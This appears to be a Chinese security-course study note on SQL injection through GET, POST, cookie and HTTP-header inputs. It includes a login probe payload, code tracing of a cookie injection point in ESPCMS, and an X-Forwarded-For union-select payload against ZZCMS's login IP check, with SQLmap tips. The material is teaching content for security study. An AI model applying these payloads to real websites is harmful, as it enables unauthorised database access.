![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135662169-5a4ced96-5242-4d54-a796-ef8ed3b704ef.png)

```plain
#知识点：
1、数据请求方式-GET&POST&COOKIE等
2、常见功能点请求方式-用户登录&IP记录等
3、黑盒白盒注入测试要点-SQLMAP注入参数

#补充点：
黑盒测试：功能点分析
白盒测试：功能点分析&关键代码追踪

1.数据库注入    - access mysql mssql oracle mongodb postgresql等
2.数据类型注入 - 数字型 字符型 搜索型 加密型(base64 json)等
3.提交方式注入 - get post cookie http头等 
4.查询方式注入 - 查询 增加 删除 更新 堆叠等
5.复杂注入利用 - 二次注入 dnslog注入 绕过bypass等

数据库类型决定攻击的手法 -payload不同
数据类型注入-payload考虑闭合，数据格式
提交方式-数据请求不同，注入的时候需要按照指定方式去测试，URL没有参数并不代表没有注入，有些数据会在数据包才能体现。http数据包任何一个地方只要被接受，都有可能产生漏洞


脚本不同的接受方式：
#部分语言接受代码块
<?php
header("Content-Type: text/html; charset=utf-8");

$get=$_GET['g'];
$post=$_POST['p'];
$cookie=$_COOKIE['c'];
$request=$_REQUEST['r'];
$host=$_SERVER['HTTP_HOST'];//当前访问URL地址
$user_agent=$_SERVER["HTTP_USER_AGENT"];//浏览器信息
$ip=$_SERVER["HTTP_X_FORWARDED_FOR"];//8.8.8.8

echo $get."<hr>";
echo $post."<hr>";
echo $cookie."<hr>";
echo $request."<hr>";
echo $host."<hr>";
echo $user_agent."<hr>";
echo $ip;
?>

Java Spring  不同框架，不同写法
method=RequestMethod.GET
method=RequestMethod.POST
request.getParameter("参数名");
可以直接获取get请求的参数key对应的value                               
也可以从请求体中获取参数的key对应的value

Python flask 不同框架，不同写法
requests.get
requests.post
request.args.get(key)
request.form.get(key)
request.values.get(key)
```

- GET&POST&COOKIE&SERVER

GET

```plain
$get=$_GET['g'];
echo $get."<hr>";
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135661522-18962194-702a-4d6d-8c3c-346af1c89be5.png)

POST

```plain
$post=$_POST['p'];
echo $post."<hr>";
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135661532-cac4220e-b329-4a1e-8a3e-fee84bc790c1.png)

COOKIE

```plain
$cookie=$_COOKIE['c'];
echo $cookie."<hr>";
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135661541-21968981-487e-401f-a8aa-ecf997a05344.png)

SERVER

```plain
$request=$_REQUEST['r'];
echo $request."<hr>";
全部请求都接受
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135661641-74ee6bb9-f69c-4eda-9baf-419a8443cdb4.png)

```plain
1.后台要记录操作访问IP
IP要进行代码的获取，获取之后，IP会不会记录到数据库中呢？
IP会写到数据库，如果IP能够自定义数据，是不是就能尝试SQL注入。

2.网站要根据访问设备给与显示页面（判断浏览器ua头信息）
接收访问UA信息，进行判断。
将各种UA进行数据库整理后，用户访问后对比数据库找那个的UA值来进行判读


3.网站要进行文件上传，用户登录
由于上传的文件可大可小，如果GET请求不满足，就用POST请求
用户登录，接收账号密码后进行数据库查询后对比（POST）

所用到的功能需要：
$host=$_SERVER['HTTP_HOST'];//当前访问URL地址
$user_agent=$_SERVER["HTTP_USER_AGENT"];//浏览器信息
$ip=$_SERVER["HTTP_X_FORWARDED_FOR"];//8.8.8.8
```

------

- 实例黑盒-后台表单登陆框-POST注入

墨者登录框，登录 抓取数据包

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135661795-ce64e249-d9dc-468c-8691-a2fca289bc50.png)

测试是否有注入点：name=xiaodi' and 1=2&password=xiaodi&login=%B5%C7%C2%BC

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135661867-20b22357-631d-47e4-8163-53ac6c7ff45d.png)

```plain
很容易看出，这个登录框是没有注入点的。
SQLmap也可以进行post注入：
1.用数据包进行测试，注入地方*注释(推荐)
2.--data "name=xiaodi&password=xiaodi"
```

------

- 实例白盒-ESPCMS-商品购买-COOKIE注入

```plain
在interface下有一个order.php文件，发现参数接受和SQL执行
参数接受：$cartid = $this->fun->accept('ecisp_order_list', 'C');
SQL执行：$sql = "SELECT did,lng,pid,mid,aid,tid,sid,fgid,linkdid,isclass,islink,ishtml,ismess,isorder,purview,recommend,tsn,title,longtitle,			color,author,source,pic,link,oprice,bprice,click,addtime,template,filename,filepath FROM $db_table WHERE $db_where";
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135661975-95ad1a86-1cff-45c1-87e3-c58613c80f55.png)

转到接收参数的函数accept中

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135662079-fe009a01-5b19-419d-b4b8-1c0ae04353a9.png)

```plain
参数接受：$cartid = $this->fun->accept('ecisp_order_list', 'C');为C，所以是cookie接收。
那么如何访问这个文件呢，这个接受参数是定义在function in_list()函数里面

代码逻辑的访问：
写代码 访问文件执行
写函数 如果不调用函数，则不能执行（访问函数执行）
那个文件调用了这个函数，或者包含这个文件
进行全局搜索：
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135662345-22fb36d6-7a0f-446b-a250-d489cba350f5.png)

```plain
但是发现都没有调用in_list()的地方
接下来打开index.php文件
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135662218-8f27018a-b393-4d1f-a091-02e304318c80.png)

```plain
定位indexget函数，发现也是接受函数。继续往下面，发现包含函数include admin_ROOT . "interface/$archive.php";
让$archive.php=order.php，控制$archive的值

生成新对象：$mainlist = new mainpage();
in_list()刚好在mainpage类里面
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135662272-cf399472-335d-4e7a-ba21-271104abe4db.png)

```plain
$archive = indexget('ac', 'R');
$action = indexget('at', 'R');

if (in_array($archive, array('article', 'forum', 'search', 'bbssearch', 'forummain', 'messmain', 'special', 'respond', 'public', 'scriptout', 'enquiry', 'enquirymain', 'form', 'formmain', 'ordermain', 'membermain', 'member', 'forum', 'order'))) {
		$action = 'in_' . $action;
		if (!file_exists(admin_ROOT . "interface/$archive.php")) {
			exit('Access error!');
		}
		include admin_ROOT . "interface/$archive.php";
		$mainlist = new mainpage();
		if (method_exists($mainlist, $action)) {
			$mainlist->$action();
		} else {
			exit('Access error!');
		}
	} else {
		exit('Access error!');
	}
通过get请求来控制archive的值，让他等于order，从而包含order.php文件。
让ac=order  at=list(代码已经自动加上了in_)
构造访问文件方法：127.0.0.1:8098/index.php?ac=order&at=list
但是payload有点超知识点，关于反序列化的。
```

------

- 实例白盒-ZZCMS-IP记录功能-HTTP头XFF注入

如果在白盒我们应该怎么知道是否接受登录IP呢，可以进行登录尝试。看看会不会限制次数，用什么来记录登录次数。（IP，其他）

```plain
IP记录，会记录IP的值来进行限制登录
在admin下里面有一个login.php（提交账号密码），请求给一个logincheck.php进行处理。
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135662335-2b4fab17-0b19-4d00-b3d3-a22ee190b2a1.png)

```plain
关键性函数getip()：$ip=getip();获取IP地址
关键性执行函数：$sqln="select * from zzcms_login_times where ip='$ip'";
有记录IP的函数，这样就会进行数据库操作
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135662431-82cf2269-0add-4999-9f9d-976a698bd608.png)

对getip()进行进一步跟踪，转到声明地方

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135662540-3d0ca155-23f0-49f3-b756-a6177231022e.png)

```plain
关键接受：if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) 
$ip = getenv("HTTP_X_FORWARDED_FOR"); 
这个可以在数据包上构造，就是X-FORWARDED-FOR:8.8.8.8
这个接受IP并没有过滤，那么可以抓包，进行登录，请求，用X-FORWARDED-FOR:8.8.8.8进行代入注入。
构造payload：X-Forwarded-For:1.2.6.4'union select 1,2,3,4#
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135662716-0bb7fe2d-4fa4-4936-a2f8-f0e7dfc106c4.png)

```plain
进行数据库监控，发现关键语句：
select * from zzcms_login_times where ip='1.2.6.4'union select 1,2,3,4#' and count>=5 and unix_timestamp()-unix_timestamp(sendtime)<900
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135662706-44888317-c9ab-41bd-951d-e9c888dd8a10.png)

也可以进行保存数据包，然后进行sqlmap进行注入。